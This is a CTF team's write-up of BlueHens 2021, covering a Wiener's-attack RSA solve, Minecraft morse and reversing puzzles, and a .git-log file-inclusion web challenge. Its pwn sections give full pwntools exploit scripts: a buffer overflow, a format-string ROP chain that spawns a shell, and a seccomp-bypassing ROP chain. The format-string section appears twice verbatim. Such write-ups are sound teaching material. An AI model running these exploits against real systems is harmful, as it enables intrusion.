---
title: "BlueHens 2021"
date: "2021-03-22"
tags: ["CTF", "BlueHens"]
---

# Crypto

## Hot diggity dog
To find the **d**, so the decryption exponent, we apply the Wiener's attack.
After finding the **d**, we decrypt the ciphertext and we find the flag.

This is the python script.

```
import owiener
from Crypto.Util.number import long_to_bytes
ct = 1445158457387990092729868574235690883328476381078437687117878228610678310947334902928151958126564073831321511131120493936116572980844392339059695082676944986711787958020467838355715919844010417357214590554232283621365683356875746321589009098953624328174730340745378234041481603493747258963262531884670382042229428718330510592290008758111173719368374299854731022071324105897071753892331177288853041690780740815531486651595502580196838941532727366305459058746061588746640490687182589242546152875181973797724210940606061367176901019489599206915050389787568489542789560060345579688651817178939492459114225606406771235955
e = 5330937005006880093598805190457883063630518250745326049791291310524191688770900677498253541876968725608988780011516913878357798140003135027183366863417959569121844853154112633643536091957118974799216641940813816076761892236211162375350644432689995305078796388972317016831896068476526526240493710949951454131783438007369494808004238449351949310021365138218085659500266511659278324660907726047634205954578349090143258122339575130486086737348129446819710953982137783348510587816619070115876002869074901265649919320219852616110355922199696052682562769419854041433691634833396620026960716117376716599744619445906636482175
n = 23556978386989862035227152665942267051448371189104346192996652142451495705784925966782823083699578017218099068429270687003013513402446285863364337355914497014903287391640470691911301379324025739991132998846569160231096469746500676982968388236346330604875221880999292763567973167457083433522181668657217912177241888729758963460176309486324449898397985561906686499104935496010357883868875083629704557203354175080409863639147851384555705571167351576323781959338290250693193849433909988970284946272004099242515681352168706645027456876652910731084445006361925449302087580591425037548670961363916624298931229939048540585477
d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    print("Hacked d={}".format(d))


pt = pow(ct,d,n)
print(pt)
print(long_to_bytes(pt))
```

UDCTF{5t1ck_t0_65537}

# Minecraft

## Morse Craft (147)

### Description
You know playing sounds on a 20Hz processor isn't as much fun as I imagined...

[Challenge source](https://gist.github.com/AndyNovo/c74ba04fbc3cd689774a1d7710af3f08)

### Gathering information
For this challenge, we are given the code for a MC86 book and quill to run inside Minecraft.
Running the code produces bell and hoe sounds resembling morse code (also hinted in the challenge's name).

### Exploitation
To decipher the morse code, we made a python script that translated bell sounds into dots and hoe sounds into lines, using the `x` pages as pauses.
This first approach didn't give us anything, the resulting morse code was just a random sequence of `E` and `O`.
After looking at the actual code, we noticed that bell sounds were always in groups of 5, hoe sounds in groups of 15 and `x`s in groups of multiples of 5.
We also re-listened to the sounds in-game and noticed that a group of just 5 `x` wasn't discernible.
So we ended up using a group of 5 bells as a single dot, a group of 15 hoes as a single line and groups of more than 5 `x` as a delimeter.
The final code is as follows:
```
#!/usr/bin/env python3

from string import *
import sys


morse = ""
file = open("morse.txt", "r")
xcount = 0
k = 0
for line in file:
    if "x" in line:
        xcount += 1
    else:
        if xcount > 5:
            morse += " "
        xcount = 0
        k += 1
        if k == 5:
            if "bell" in line:
                k = 0
                morse += "."
            elif "x" in line:
                k = 0
                morse += " "
        elif k == 15:
            if "hoe" in line:
                morse += "-"
                k = 0

print(morse)
````
The resulting morse was: `-.-. .-. .- ..-. - .. -. --. -- --- .-. ... . ..-. --- .-. - .... . .-- .. -.`
Translating this code did bear results and we ended up with `CRAFTINGMORSEFORTHEWIN`

### Flag
`UDCTF{CRAFTINGMORSEFORTHEWIN}`

# Pwn

## beef-of-finitude (100)

### Description
> Fun for all ages

> challenges.ctfd.io:30027

### Gathering information
We are given an executable and a remote service to exploit.

Let's inspect the binary.

```console
> file bof.out
bof.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0a74e270e67dbd80d4fbed7d3fc1dfda9f48fee4, for GNU/Linux 3.2.0, not stripped
```
The binary is not stripped and with `nm` we can already see some interesting functions:

```console
> nm bof.out
...
0804c034 B flag
...
08049405 T main
0804934e T myFun
...
08049236 T win
...
```

Let's check for security measures:

```console
> checksec bof.out
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
No Stack canaries and PIE, this could be an easy buffer overflow if we have a vulnerable function.

By looking at the binary symbols or by running the program with `ltrace` we can see that the user input is taken via `fgets`.

`fgets` reads in at most one less than the specified argument of characters from a stream and stores them into the specified buffer.

We are *lucky* since the guard is way to high to prevent a buffer overflow on the array where our input will be saved.

Let's inspect the binary in `Ghidra` to see if we can gather more information about the previously seen functions.

*myFun*:

```c
void myFun(void)
{
	char second_buffer[10];
	char first_buffer[16];
	int var_to_change = 7;
	
	puts("Enter your Name: ");
	fgets(first_buffer, 16, stdin);
	puts("Enter your password: ");
	fgets(second_buffer, 336, stdin);
	if (var_to_change == -0x21524111)  // 0xdeadbeef
	{
		flag = 1;
		puts("Wow you overflowed the right value! Now try to find the flag !\n");
	}
	else 
	{
		puts("Try again!\n");
	}
	return;
}
```

And *win*:

```c
void win(uint param_1,uint param_2,uint param_3,uint param_4)
{
	char flag_buffer [256];
	FILE *file_ptr;

	if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0)) && (flag == 1)) 
	{
		file_ptr = fopen("./flag.txt","r");
		if (file_ptr == (FILE *)0x0) 
		{
			puts("flag.txt not found - ping us on discord if this is happening on the shell server\n");
		}
		else 
		{
			fgets(flag_buffer,0x100,file_ptr);
			printf("flag: %s\n",flag_buffer);
		}
		return;
	}
	puts("Close, but not quite.\n");
	exit(1);
}
```

So, as an high level overview, we need to:

1. Trigger a buffer overflow
2. Rewrite the variable checked against `0xdeadbeef` on the `myFun` function
3. Rewrite the instruction pointer to redirect the execution to the `win` function
4. Set the right arguments to pass the if-statement and trigger the `fopen` call


### Exploitation
We can write a script with `pwntools` to exploit the remote server: 

```python
#!/usr/bin/env python3

from pwn import *

e = context.binary = ELF("./bof.out")
io = remote("challenges.ctfd.io", 30027)

OFFSET_TO_VAR = 41
OFFSET_TO_IP  = 12

pad_1 = b"A" * OFFSET_TO_VAR
pad_2 = b"A" * OFFSET_TO_IP

stack_frame =  p32(e.symbols["win"]) 
stack_frame += p32(e.symbols["exit"])
stack_frame += p32(0x14b4da55) 			# param_1
stack_frame += p32(0)          			# param_2
stack_frame += p32(0x67616c66) 			# param_3
stack_frame += p32(0)          			# param_4
info(f"{stack_frame = }")

payload = pad_1 + p32(0xdeadbeef) + pad_2 + stack_frame
info(f"{payload = }")

io.sendline(payload)
io.recvuntil(b"flag:")
flag = io.recvline().strip().decode()
io.close()

success(f"{flag = }")
```

### The Flag
`UDCTF{0bl1g4t0ry_buff3r_ov3rflow}`

### Conclusion
This challenge neatly demonstrates a simple buffer overflow, with an overwriting of a local variable and passing parameters to a function to get our flag.

## ForMatt Zelinsky (461 points)

### Description

Right? What? Wear? Pants? Built on Ubuntu 20.04.

### Gathering information

We can decompile the program with Ghidra. It extracts the following pseudo-c-code:

```c
int main(EVP_PKEY_CTX *param_1)

{
  char buffer [336];
  
  init(param_1);
  puts("Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(");
  puts("Thankfully, I\'m generous and will grant you two leaks");
  printf("This stack leak might be useful %p\n",buffer);
  printf("And this PIE leak might be useful %p\n",main);
  puts("Now gimme your payload");
  fgets(buffer,0x150,stdin);
  printf("Is this what you meant? ");
  printf(buffer);
  return 0;
}
```

As 0x150 = 336, there is no buffer overflow. But there is indeed a format string vulnerability ([if you have no idea what this is, check this link](https://www.youtube.com/watch?v=CyazDp-Kkr0)) as the program uses `printf` on our input buffer without any check.

### Exploitation

The idea is the following: we can use the format string vulnerability to write and execute a ropchain. Having this in mind, it's relatively simple to exploit the vulnerability.

```python
#!/usr/bin/env python3

from pwn import *

HOST = "challenges.ctfd.io"
PORT = 30042

exe = ELF("./formatz")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
        return process([exe.path])
    else:
        libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)
        return remote(HOST, PORT), libc


def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.recvall()


def main():

    # good luck pwning :)

    # Determine format string offset automatically (thx pwntools <3)
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    log.info(f'Format string offset: {offset}')
    
    io, libc = conn()

    buff_len = 0x150

    # --------------------------------------------------- #
    # ------------------- leaking libc ------------------ #
    # --------------------------------------------------- #
    
    # Recieve the leaks
    io.recvuntil('This stack leak might be useful ')
    stack_leak = int(io.recvline()[2:-1], 16)
    log.info(f"stack @ {hex(stack_leak)}")
    io.recvuntil('And this PIE leak might be useful ')
    main_leak = int(io.recvline()[2:-1], 16)
    exe.address = main_leak - exe.symbols['main']
    log.info(f"base address @ {hex(exe.address)}")
    
    # The offset to RIP is calculated as following
    rip = stack_leak + buff_len + 8 # 8 = RBP length!
    
    # We make use of this useful gadget
    pop_rdi = exe.address + 0x00000000000012bb # pop rdi; ret;

    # We now use the format string vulnerability to write and execute a ropchain
    # Overwrite EIP with whatever we want and use it to leak LIBC.
    # In order to leak libc we execute puts with a function's GOT entry address as an argument.
    # This way puts will print out, as a string, the address of the function inside libc.
    # 
    # Notice that, after leaking LIBC base address, we return to main.
    # This is done to make it simple to execute another ropchain from a clear environment!
    #
    # Note: we use the function provided by pwntools because:
    #    - I'm lazy
    #    - It would be a hell of calculations to do this by hand
    leak_func = 'setvbuf'
    payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: exe.got[leak_func], rip+16: exe.symbols['puts'], rip+24: exe.symbols['main']}, write_size='short')
    
    # Send payload...
    io.sendline(payload)

    # ...and recieve the leak
    io.recvuntil('\x7f')
    libc_leak = u64(io.recvuntil('\x7f').ljust(8, b'\x00'))
    log.info(f'{leak_func} @ {hex(libc_leak)}')
    
    # Set the base address of libc, based on the leak
    # Notice that the correct libc version was determined by leaking different functions
    # and using the online libc database https://libc.blukat.me/
    libc.address = libc_leak - libc.symbols[leak_func]
    log.info(f'libc base @ {hex(libc.address)}')
    
    # --------------------------------------------------- #
    # ---------------- execve('/bin/sh') ---------------- #
    # --------------------------------------------------- #
    
    # Same as above, get leaks
    io.recvuntil('This stack leak might be useful ')
    stack_leak = int(io.recvline()[2:-1], 16)
    log.info(f"stack @ {hex(stack_leak)}")
    io.recvuntil('And this PIE leak might be useful ')
    main_leak = int(io.recvline()[2:-1], 16)
    exe.address = main_leak - exe.symbols['main']
    log.info(f"base address @ {hex(exe.address)}")
    
    # Re-calculate rip address
    # The gadget positions stays the same (and we don't need it anyway)
    rip = stack_leak + buff_len + 8 
    
    # Overwrite EIP with a onegadget that executes execve('/bin/sh', NULL, NULL) under some constraint.
    # A onegadget is basically a sequence of instructions in a certain libc that makes the execve('/bin/sh', NULL, NULL) syscall.
    # I don't usually check if the given constraints are respected, I just try them.
    # 
    # $ onegadget libc6_2.31-0ubuntu9.2_amd64.so
    # 0xe6c7e execve("/bin/sh", r15, r12)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [r12] == NULL || r12 == NULL
    # 
    # 0xe6c81 execve("/bin/sh", r15, rdx)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [rdx] == NULL || rdx == NULL
    # 
    # 0xe6c84 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL
    
    # Send the payload
    onegadget = libc.address + 0xe6c81
    payload = fmtstr_payload(offset, {rip: onegadget})
    io.sendline(payload)

    # Profit
    io.interactive()


if __name__ == "__main__":
    main()

```

Notice that this exploit sometimes fails to execute for unknown reasons. 

### The Flag

We can then `cat flag.txt` and get the flag: `UDCTF{write-what-wear-pantz-660714392699745151725739719383302481806841115893230100153376}`

### Conclusions

I usually dislike format string vulnerabilities. They are tedious and, let me say this, dumb. Even the compiler knows that you are doing something wrong and gives you a warning if you attempt to compile something with a format string vulnerability in it.

Nonetheless, I enjoyed this challenge a lot. Executing a ropchain via format string was very funny and a good learning experience.

## Sandboxed ROP (445 points)

### Description

Chain of Fools Chain, keep us together. Running in the shadow. 
Flag is in /pwn/flag.txt

nc challenges.ctfd.io 30018

running on ubuntu 20.04

### Gathering information

We can decompile the binary using Ghidra.
The main function looks like this:

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  undefined buffer [16];
  
  init(param_1);
  init_seccomp();
  puts("pwn dis shit");
  read(0,buffer,0x200);
  return 0;
}
```

We can already notice the buffer overflow. This time, though, there's a catch.

The `init_seccomp()` function has included some seccomp rules. These are basically rules that are placed in the program to make it behave in some secure way. Check the manual for more informations.

The decompiled function looks like this:

```c
void init_seccomp(void)

{
  undefined8 seccomp_filter;
  
  seccomp_filter = seccomp_init(0);
  seccomp_rule_add(seccomp_filter,0x7fff0000,2,0);
  seccomp_rule_add(seccomp_filter,0x7fff0000,0,0);
  seccomp_rule_add(seccomp_filter,0x7fff0000,1,0);
  seccomp_rule_add(seccomp_filter,0x7fff0000,0xe7,0);
  seccomp_rule_add(seccomp_filter,0x7fff0000,0x101,0);
  seccomp_load(seccomp_filter);
  return;
}

```

This function is initializing and loading a seccomp filter that basically forbids every syscall but the read, write, open, exit_group and openat ones.

Hence, we need to develop an exploit using these syscall only.


### Exploitation

The main idea of the exploit is to:

 - Leak libc in order to be able to call `open` (we are missing a sycall instruction!)
 - Write `/pwn/flag.txt` to memory and call `open` with it
 - Read from the opened file descriptor, then output what we've read


We've developed a small POC before trying to exploit this, in order to make sure that the idea would have worker:

```c
#include <stdio.h>
#include <seccomp.h>       
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>


int main(){
  
    scmp_filter_ctx uVar1 = seccomp_init(0), uVar2;
    seccomp_rule_add(uVar1,0x7fff0000,2,0);
    seccomp_rule_add(uVar1,0x7fff0000,0,0);
    seccomp_rule_add(uVar1,0x7fff0000,1,0);
    seccomp_rule_add(uVar1,0x7fff0000,0xe7,0);
    seccomp_rule_add(uVar1,0x7fff0000,0x101,0);
    seccomp_load(uVar1);
    
    int fd = open("./flag.txt",O_RDONLY);
    if(fd == -1){
        write(1, "Did you create the flag.txt file?\n", 34);
    }

    char buff[20] = {0};
    read(fd, buff, 20);
    write(1, buff, 20);
}
```

Compiling it with gcc (the `-lseccomp` flag was needed) and executing printed out our fake flag, so we were good to go!

```python
#!/usr/bin/env python3

from pwn import *

HOST = 'challenges.ctfd.io'
PORT = 30018

exe = ELF('./chal.out')
rop = ROP(exe)

context.binary = exe
context.log_level = 'debug'

def conn():
    if args.LOCAL:
        libc = ELF('/usr/lib/libc-2.33.so', checksec = False)
        return process([exe.path]), libc, './flag.txt'
    else:
        libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so', checksec = False)
        return remote(HOST, PORT), libc, '/pwn/flag.txt'


def create_rop(ropchain):
    buff_len = 0x16
    payload  = b'A' * buff_len
    payload += b'B' * 2
    payload += ropchain

    return payload

def main():
    io, libc, flag = conn()

    # good luck pwning :)

    # ---------------------------------------------------- #
    # ---------------------- gadgets --------------------- #
    # ---------------------------------------------------- #
    pop_rsp = 0x000000000040139d # pop rsp; pop r13; pop r14; pop r15; ret;
    pop_rdi = 0x00000000004013a3 # pop rdi; ret;
    pop_rsi = 0x00000000004013a1 # pop rsi; pop r15; ret;
    pop_rdx = 0x00000000004011de # pop rdx; ret;

    pwn_dis_shit_ptr = 0x00402004 # 'pwn dis shit'

    # ---------------------------------------------------- #
    # ------------------- leaking libc ------------------- #
    # ---------------------------------------------------- #
    rop = ROP(exe)
    leak_func = 'read'

    # Note: we MUST leak libc because we do NOT have any 'syscall' instruction!

    # We can use the bss segment to read/write another ropchain.
    # We need to write another ropchain because we do not know, 
    # at the time of sending this rop, the base of libc.
    other_ropchain_addr = exe.bss(100)

    # Leak reading with puts the GOT of a function
    rop.puts(exe.got[leak_func])
    rop.puts(pwn_dis_shit_ptr) # used as a marker to send the second ropchain

    # Read the second ropchain into memory at the specified address
    rop.read(0, other_ropchain_addr, 0x1000)

    # PIVOT the stack into the second ropchain
    # We are popping the RSP register, effectively moving our stack
    # to the specified popped address. The program will keep executing
    # normally, but the stack will be at our chosen position
    rop.raw(pop_rsp)
    rop.raw(other_ropchain_addr)
    
    # Just a little debugging trick for ropchains
    log.info('# ================ ROP 1 ================= #')
    log.info(rop.dump())

    # Send the payload
    payload = create_rop(rop.chain())
    io.sendlineafter('pwn dis shit', payload)
    
    # Get the libc leak. We again use https://libc.blukat.me 
    # to find the correct libc version used on the server
    libc_leak = u64(io.recvuntil('\x7f')[1:].ljust(8, b'\x00'))
    log.info(f'{leak_func} @ {hex(libc_leak)}')
    libc.address = libc_leak - libc.symbols[leak_func]
    log.info(f'libc base @ {hex(libc.address)}')
    
    # Some useful gadgets from libc
    mov_ptrrdx_eax = libc.address + 0x00000000000374b1 # mov dword ptr [rdx], eax; ret;
    syscall_ret = libc.address + 0x0000000000066229 # syscall; ret;

    # ---------------------------------------------------- #
    # -------------- open('/pwn/flag.txt') --------------- #
    # ------------- read(flagfd, mem, len) --------------- #
    # ------------- write(stdout, mem, len) -------------- #
    # ---------------------------------------------------- #

    rop = ROP(exe)

    strings_addr = exe.bss(400) # a place far enough from our ropchain

    # 3 POPs to adjust previous stack pivoting
    # The pop_rsp gadget was also popping other 3 registers!  
    rop.raw(0)
    rop.raw(0)
    rop.raw(0)

    # Read the '/pwn/flag.txt' string from stdin
    rop.read(0, strings_addr, len(flag))

    # Execute the open('/pwn/flag.txt') libc function (this is why we needed libc btw)
    rop.raw(pop_rdi)
    rop.raw(strings_addr)
    rop.raw(pop_rsi)
    rop.raw(0x000) # O_RDONLY
    rop.raw(0) # pop_rsi pops 2 registers!
    rop.raw(libc.symbols['open'])

    # The followings instructions were used to check if the file descriptor 
    # from whom we were trying to read was correct. We also determined this by
    # debugging the exploit with gdb in an ubuntu 20.04 container (which was the
    # one used in the challenge, as the description reported).
    # 
    # We determined that the correct fd was 5
    #  
    # rop.raw(pop_rdx)
    # rop.raw(exe.bss(600))
    # rop.raw(mov_ptrrdx_eax)
    # rop.puts(exe.bss(600))

    # Read into our address the flag...
    rop.read(5, strings_addr, 50)

    # ...and then print it out
    rop.puts(exe.bss(400))
    
    log.info('# ================ ROP 2 ================= #')
    log.info(rop.dump())

    # Send second ropchain
    io.sendlineafter('pwn dis shit', rop.chain())

    # Send the flag filename ('/pwn/flag.txt' on the server)
    io.send(flag)
    
    # Profit
    log.success(f'Flag: {io.recvall().decode().strip()}')


if __name__ == '__main__':
    main()

```

### The Flag

The flag was `UDCTF{R0PEN_RE@D_WR!T3_right??}`

### Conclusion

Indeed a fun and instructive challenge. That's the first time I've seen this `seccomp` stuff!

## ForMatt Zelinsky (461 points)

### Description

Right? What? Wear? Pants? Built on Ubuntu 20.04.

### Gathering information

We can decompile the program with Ghidra. It extracts the following pseudo-c-code:

```c
int main(EVP_PKEY_CTX *param_1)

{
  char buffer [336];
  
  init(param_1);
  puts("Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(");
  puts("Thankfully, I\'m generous and will grant you two leaks");
  printf("This stack leak might be useful %p\n",buffer);
  printf("And this PIE leak might be useful %p\n",main);
  puts("Now gimme your payload");
  fgets(buffer,0x150,stdin);
  printf("Is this what you meant? ");
  printf(buffer);
  return 0;
}
```

As 0x150 = 336, there is no buffer overflow. But there is indeed a format string vulnerability ([if you have no idea what this is, check this link](https://www.youtube.com/watch?v=CyazDp-Kkr0)) as the program uses `printf` on our input buffer without any check.

### Exploitation

The idea is the following: we can use the format string vulnerability to write and execute a ropchain. Having this in mind, it's relatively simple to exploit the vulnerability.

```python
#!/usr/bin/env python3

from pwn import *

HOST = "challenges.ctfd.io"
PORT = 30042

exe = ELF("./formatz")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        libc = ELF('/usr/lib/libc-2.33.so', checksec=False)
        return process([exe.path])
    else:
        libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so', checksec=False)
        return remote(HOST, PORT), libc


def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.recvall()


def main():

    # good luck pwning :)

    # Determine format string offset automatically (thx pwntools <3)
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    log.info(f'Format string offset: {offset}')
    
    io, libc = conn()

    buff_len = 0x150

    # --------------------------------------------------- #
    # ------------------- leaking libc ------------------ #
    # --------------------------------------------------- #
    
    # Recieve the leaks
    io.recvuntil('This stack leak might be useful ')
    stack_leak = int(io.recvline()[2:-1], 16)
    log.info(f"stack @ {hex(stack_leak)}")
    io.recvuntil('And this PIE leak might be useful ')
    main_leak = int(io.recvline()[2:-1], 16)
    exe.address = main_leak - exe.symbols['main']
    log.info(f"base address @ {hex(exe.address)}")
    
    # The offset to RIP is calculated as following
    rip = stack_leak + buff_len + 8 # 8 = RBP length!
    
    # We make use of this useful gadget
    pop_rdi = exe.address + 0x00000000000012bb # pop rdi; ret;

    # We now use the format string vulnerability to write and execute a ropchain
    # Overwrite EIP with whatever we want and use it to leak LIBC.
    # In order to leak libc we execute puts with a function's GOT entry address as an argument.
    # This way puts will print out, as a string, the address of the function inside libc.
    # 
    # Notice that, after leaking LIBC base address, we return to main.
    # This is done to make it simple to execute another ropchain from a clear environment!
    #
    # Note: we use the function provided by pwntools because:
    #    - I'm lazy
    #    - It would be a hell of calculations to do this by hand
    leak_func = 'setvbuf'
    payload = fmtstr_payload(offset, {rip: pop_rdi, rip+8: exe.got[leak_func], rip+16: exe.symbols['puts'], rip+24: exe.symbols['main']}, write_size='short')
    
    # Send payload...
    io.sendline(payload)

    # ...and recieve the leak
    io.recvuntil('\x7f')
    libc_leak = u64(io.recvuntil('\x7f').ljust(8, b'\x00'))
    log.info(f'{leak_func} @ {hex(libc_leak)}')
    
    # Set the base address of libc, based on the leak
    # Notice that the correct libc version was determined by leaking different functions
    # and using the online libc database https://libc.blukat.me/
    libc.address = libc_leak - libc.symbols[leak_func]
    log.info(f'libc base @ {hex(libc.address)}')
    
    # --------------------------------------------------- #
    # ---------------- execve('/bin/sh') ---------------- #
    # --------------------------------------------------- #
    
    # Same as above, get leaks
    io.recvuntil('This stack leak might be useful ')
    stack_leak = int(io.recvline()[2:-1], 16)
    log.info(f"stack @ {hex(stack_leak)}")
    io.recvuntil('And this PIE leak might be useful ')
    main_leak = int(io.recvline()[2:-1], 16)
    exe.address = main_leak - exe.symbols['main']
    log.info(f"base address @ {hex(exe.address)}")
    
    # Re-calculate rip address
    # The gadget positions stays the same (and we don't need it anyway)
    rip = stack_leak + buff_len + 8 
    
    # Overwrite EIP with a onegadget that executes execve('/bin/sh', NULL, NULL) under some constraint.
    # A onegadget is basically a sequence of instructions in a certain libc that makes the execve('/bin/sh', NULL, NULL) syscall.
    # I don't usually check if the given constraints are respected, I just try them.
    # 
    # $ onegadget libc6_2.31-0ubuntu9.2_amd64.so
    # 0xe6c7e execve("/bin/sh", r15, r12)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [r12] == NULL || r12 == NULL
    # 
    # 0xe6c81 execve("/bin/sh", r15, rdx)
    # constraints:
    #   [r15] == NULL || r15 == NULL
    #   [rdx] == NULL || rdx == NULL
    # 
    # 0xe6c84 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL
    
    # Send the payload
    onegadget = libc.address + 0xe6c81
    payload = fmtstr_payload(offset, {rip: onegadget})
    io.sendline(payload)

    # Profit
    io.interactive()


if __name__ == "__main__":
    main()

```

Notice that this exploit sometimes fails to execute for unknown reasons. 

### The Flag

We can then `cat flag.txt` and get the flag: `UDCTF{write-what-wear-pantz-660714392699745151725739719383302481806841115893230100153376}`

### Conclusions

I usually dislike format string vulnerabilities. They are tedious and, let me say this, dumb. Even the compiler knows that you are doing something wrong and gives you a warning if you attempt to compile something with a format string vulnerability in it.

Nonetheless, I enjoyed this challenge a lot. Executing a ropchain via format string was very funny and a good learning experience.

# Rev

## Me, Crack (296)

### Description
Classic Password Cracking re-imagined for a new generation.
[Challenge source](https://gist.github.com/AndyNovo/9d9b8ddc5b09e9f3e6203eb3cbfc19a1)

### Gathering Information
We are given the code to spawn a `book and quill` with the code to run on the MC86 machine.
The first page of the book asks us to write the flag on another book, one character per page.
We can then guess that the code on book checks if the flag is the correct one.
Looking at the code we can see that the functioon checks pages 0 to 15, so our flag will be 16 characters long.
For each page, the function reads the character on it and does 3 different operations, with 2 variables, arg1 and arg2.
arg2 is set before an operation occurs, while arg1 is the result of the previous, except for the first one.
After the three operation, arg1 is compared to xval, which is the ASCII code of our character.

### Exploitation
Given that the same operations are done for each page, we can extract the 4 numbers used and put them in 4 different arrays.
To find out all the characters, we can just translate the result of the third operation to a character for every page.
```
a = [68, 1, 8, 15, 9, 12, 67, 2, 19, 28, 320, 62, 12, 17, 33, 86]
b = [235, 399, 193, 377, 551, 181, 294, 459, 901, 555, 71, 218, 242, 151, 680, 31]
c = [17, 19, 178, 365, 17, 63, 139, 37, 793, 522, 1, 144, 84, 81, 305, 19]
d = [663, 350, 331, 848, 223, 176, 760, 148, 992, 552, 838, 972, 973, 183, 756, 256]

flag = ""
for i in range(16):
	a[i] = a[i] * b[i]
	a[i] = a[i] + c[i]
	a[i] = a[i] % d[i]
	flag += chr(a[i])
print(flag)
```
Now we can run the script and find out the flag.

### Flag
`UDCTF{MC86_4EVA}`

### Conclusion
This challenge is a nice introduction to reverse engineering, beginners can easily solve it without knowledge of any tool.

# Web

## ctfvc (100)

### Description

> challenges.ctfd.io:30595

> find flag.txt

### Gathering information

We are given an IP to connect to.

When opening the web page we are greated with some php code:

```php
 <?php
  if (isset($_GET['file'])){
    $file = $_GET['file'];
    if (strpos($file, "..") === false){
      include(__DIR__ . $file);
    }
  }
  //Locked down with version control waddup 
  echo highlight_file(__FILE__, true);
?>
```

This seems like a perfect `LFI` vulnerabilty, but, as we can see from the source code, we can't climb back in the directory hierarchy.

The name of the challenge and the comment in the source suggests that we might have a `.git` directory somewhere.

Let's try to access the directory:

```console
> curl http://challenges.ctfd.io:30595/.git/

...
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
...
```

Okay, so we have a `.git` directory, but we can't access it, let's exploit our vulnerabilty.

### Exploitation

We can use the vulnerability to see if we can find something interesting in the `.git` directory:

```console
> curl http://challenges.ctfd.io:30595/?file=/.git/logs/refs/heads/master

0000000000000000000000000000000000000000 862ff4b638b509e5fe354d3a93e49712f0684887 Sucks At <sucks@web.sec> 1615233879 +0000     commit (initial): not including flag directory 1a2220dd8c13c32e in the version control system
...
```

We have an interesting commit log in the `.git/logs/refs/heads` directory, where a directory named `1a2220dd8c13c32e` is referenced.

Let's see if we can exfiltrate that thanks to the vulnerability.

```console
> curl http://challenges.ctfd.io:30595/?file=/1a2220dd8c13c32e/flag.txt

UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}
...
```
And sure enough we have our flag!

### The Flag

`UDCTF{h4h4_suck3rs_i_t0tally_l0ck3d_th1s_down}`

### Conclusion

This challenge was a nice introduction to local file inclusion vulnerabilites, requiring also a bit of git knowledge to get the flag.

